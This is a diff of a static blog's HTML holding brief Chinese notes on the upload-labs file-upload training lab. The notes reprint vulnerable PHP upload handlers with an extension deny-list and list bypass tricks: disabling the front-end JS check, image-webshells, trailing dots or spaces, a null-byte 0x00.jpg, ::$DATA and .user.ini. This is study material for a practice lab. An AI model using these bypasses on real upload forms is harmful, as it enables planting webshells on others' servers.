-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/前端绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>没抓到包，说明还没发到后端，在前端就被拦截下来了</p>
-<h1 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h1><h2 id="1-由于找到是前端且js，所以我们直接禁用js"><a href="#1-由于找到是前端且js，所以我们直接禁用js" class="headerlink" title="1.由于找到是前端且js，所以我们直接禁用js"></a>1.由于找到是前端且js，所以我们直接禁用js</h2><h2 id="2-我们可以把绕过函数那个检测删除掉"><a href="#2-我们可以把绕过函数那个检测删除掉" class="headerlink" title="2.我们可以把绕过函数那个检测删除掉"></a>2.我们可以把绕过函数那个检测删除掉</h2><p><img src="/.com//image-20250114181752-uow71t3.png" alt="image"></p>
-<p>删除掉以后，我们可以直接上传php一句话木马</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" data-id="cmawczpo9002sik7k2wmsesyt" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Pass-15" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>由于判定其实是上一关是差不多的，所以还是上传一个图片马即可</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" data-id="cmawczpo9002tik7k5s6kdwdn" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/后缀绕过总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="后缀绕过总结"><a href="#后缀绕过总结" class="headerlink" title="后缀绕过总结"></a>后缀绕过总结</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//获得最后一个点后面所有的字符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">//移动的时候会按照服务器来消除一些后缀</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>因为是先判断在上传服务器，所以不是条件竞争，就只是一个后缀绕过，当然这个没有禁用.user.ini，不过还可以用‘.’和空格来绕过\也可以</p>
-<p>因为是post也可以尝试一下0x00.jpg</p>
-<p>还可以尝试::$DATA</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" data-id="cmawczpoa002uik7keq8r7xp4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" data-id="cmaxy8gcc003bkg7kd3k0ddbu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -646,19 +838,19 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
           </li>
         
       </ul>
